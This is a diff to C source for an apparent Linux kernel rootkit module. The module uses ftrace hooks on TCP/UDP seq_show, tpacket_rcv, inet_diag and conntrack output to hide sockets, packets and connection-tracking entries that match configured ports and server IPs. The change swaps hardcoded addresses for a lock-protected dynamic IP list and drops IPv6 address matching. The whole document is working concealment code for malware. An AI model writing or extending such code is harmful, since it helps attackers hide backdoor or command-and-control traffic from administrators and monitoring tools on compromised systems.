@@ -13,30 +13,36 @@ static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v);
 static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
                                 struct packet_type *pt, struct net_device *orig_dev);
 
-static const struct in6_addr ipv6_ip_ = YOUR_SRV_IPv6;
-static const struct in6_addr ipv6_ip2_ = YOUR_SRV_IPv6_2;
-static __be32 cached_ipv4 = 0;
-static __be32 cached_ipv4_2 = 0;
-
-static inline void init_cached_ip(void) {
-    if (unlikely(cached_ipv4 == 0))
-        cached_ipv4 = in_aton(YOUR_SRV_IP);
-    if (unlikely(cached_ipv4_2 == 0))
-        cached_ipv4_2 = in_aton(YOUR_SRV_IP2);
-}
+static const u16 hidden_ports[MAX_INSTANCES] = { PORT, PORT2 };
 
 static inline bool is_hidden_port(u16 port) {
-    return (port == PORT || port == PORT2);
+    int i;
+    for (i = 0; i < MAX_INSTANCES; i++)
+        if (port == hidden_ports[i])
+            return true;
+    return false;
 }
 
 static inline bool is_hidden_ipv4(__be32 addr) {
-    init_cached_ip();
-    return (addr == cached_ipv4 || addr == cached_ipv4_2);
+    int i;
+    unsigned long flags;
+    __be32 snap[MAX_INSTANCES];
+
+    if (addr == 0)
+        return false;
+
+    spin_lock_irqsave(&g_srv_ips_lock, flags);
+    for (i = 0; i < MAX_INSTANCES; i++)
+        snap[i] = g_srv_ips[i];
+    spin_unlock_irqrestore(&g_srv_ips_lock, flags);
+
+    for (i = 0; i < MAX_INSTANCES; i++)
+        if (snap[i] != 0 && addr == snap[i])
+            return true;
+    return false;
 }
 
-static inline bool is_hidden_ipv6(const struct in6_addr *addr) {
-    return ipv6_addr_equal(addr, &ipv6_ip_) || ipv6_addr_equal(addr, &ipv6_ip2_);
-}
+/* IPv6 connections are hidden by port only (no dynamic IPv6 IP tracking). */
 
 static notrace bool should_hide_sock(struct sock *sk)
 {
@@ -45,13 +51,11 @@ static notrace bool should_hide_sock(struct sock *sk)
     
     if (!sk)
         return false;
-    
+
     inet = inet_sk(sk);
     if (!inet)
         return false;
-    
-    init_cached_ip();
-    
+
     sport = ntohs(inet->inet_sport);
     dport = ntohs(inet->inet_dport);
     
@@ -60,11 +64,6 @@ static notrace bool should_hide_sock(struct sock *sk)
     
     if (sk->sk_family == AF_INET) {
         if (is_hidden_ipv4(inet->inet_saddr) || is_hidden_ipv4(inet->inet_daddr))
-            return true;
-    }
-    
-    if (sk->sk_family == AF_INET6) {
-        if (is_hidden_ipv6(&sk->sk_v6_rcv_saddr) || is_hidden_ipv6(&sk->sk_v6_daddr))
             return true;
     }
     
@@ -197,9 +196,7 @@ static notrace int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *de
         
         ip6h = ipv6_hdr(skb);
         
-        if (is_hidden_ipv6(&ip6h->daddr) || is_hidden_ipv6(&ip6h->saddr))
-            return NET_RX_DROP;
-        
+        /* IPv6 hidden by port only - no dynamic IPv6 IP tracking. */
         if (ip6h->nexthdr == IPPROTO_TCP) {
             if (skb->len < sizeof(struct ipv6hdr) + sizeof(struct tcphdr))
                 goto out;
@@ -245,10 +242,8 @@ static notrace bool should_hide_inet_diag(struct inet_diag_msg *diag)
     }
     
     else if (diag->idiag_family == AF_INET6) {
-        struct in6_addr *src = (struct in6_addr *)diag->id.idiag_src;
-        struct in6_addr *dst = (struct in6_addr *)diag->id.idiag_dst;
-        if (is_hidden_ipv6(src) || is_hidden_ipv6(dst))
-            return true;
+        /* IPv6 hidden by port only - no dynamic IPv6 IP tracking. */
+        (void)diag;
     }
     
     return false;
@@ -326,11 +321,6 @@ notrace long filter_conntrack_messages(unsigned char *buf, long len)
     long remaining = len;
     long new_len = 0;
     bool any_filtered = false;
-    unsigned char *ip_bytes = (unsigned char *)&cached_ipv4;
-    unsigned char *ip2_bytes = (unsigned char *)&cached_ipv4_2;
-
-    init_cached_ip();
-    
     if (len <= 0 || len > 131072)
         return len;
     
@@ -357,12 +347,27 @@ notrace long filter_conntrack_messages(unsigned char *buf, long len)
             unsigned int search_len = nlh->nlmsg_len;
             unsigned int i;
             
-            for (i = 0; i <= search_len - 4; i++) {
-                if (memcmp(search_pos + i, ip_bytes, 4) == 0 ||
-                    memcmp(search_pos + i, ip2_bytes, 4) == 0) {
-                    hide = true;
-                    any_filtered = true;
-                    break;
+            {
+                int s;
+                __be32 snap[MAX_INSTANCES];
+                unsigned long flags;
+
+                spin_lock_irqsave(&g_srv_ips_lock, flags);
+                for (s = 0; s < MAX_INSTANCES; s++)
+                    snap[s] = g_srv_ips[s];
+                spin_unlock_irqrestore(&g_srv_ips_lock, flags);
+
+                for (s = 0; s < MAX_INSTANCES && !hide; s++) {
+                    if (snap[s] != 0) {
+                        unsigned char *ip_bytes = (unsigned char *)&snap[s];
+                        for (i = 0; i <= search_len - 4; i++) {
+                            if (memcmp(search_pos + i, ip_bytes, 4) == 0) {
+                                hide = true;
+                                any_filtered = true;
+                                break;
+                            }
+                        }
+                    }
                 }
             }
         }
@@ -413,8 +418,6 @@ static struct ftrace_hook hooks[] = {
 
 notrace int hiding_tcp_init(void)
 {
-    init_cached_ip();
-    
     return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 }
 
